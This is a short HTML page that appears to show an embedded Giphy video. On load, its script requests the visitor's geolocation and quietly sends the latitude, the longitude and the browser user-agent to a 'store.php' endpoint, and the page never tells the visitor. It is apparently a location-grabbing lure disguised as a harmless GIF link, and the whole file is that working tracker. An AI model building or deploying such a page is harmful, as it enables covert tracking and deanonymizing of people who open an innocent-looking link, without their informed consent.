<!DOCTYPE html>
<html>
<body onload="getLocation()">

    <div style="width:480px"><iframe allow="fullscreen" frameBorder="0" height="360" src="https://giphy.com/embed/2KZ2v2vifTGTvGg1fu/video" width="480"></iframe></div>



<p id="demo"></p>

<script>
var x = document.getElementById("demo");

function getLocation() {
  if (navigator.geolocation) {
    navigator.geolocation.getCurrentPosition(showPosition);
  } else { 
    x.innerHTML = "Geolocation is not supported by this browser.";
  }
}

function showPosition(position) {
    const xhttp = new XMLHttpRequest();
    let agent = navigator.userAgent;
    xhttp.open("GET", "store.php?lat=" +position.coords.latitude + "&long=" +position.coords.longitude + "&agent=" +agent);
  xhttp.send();
}
</script>

</body>
</html>
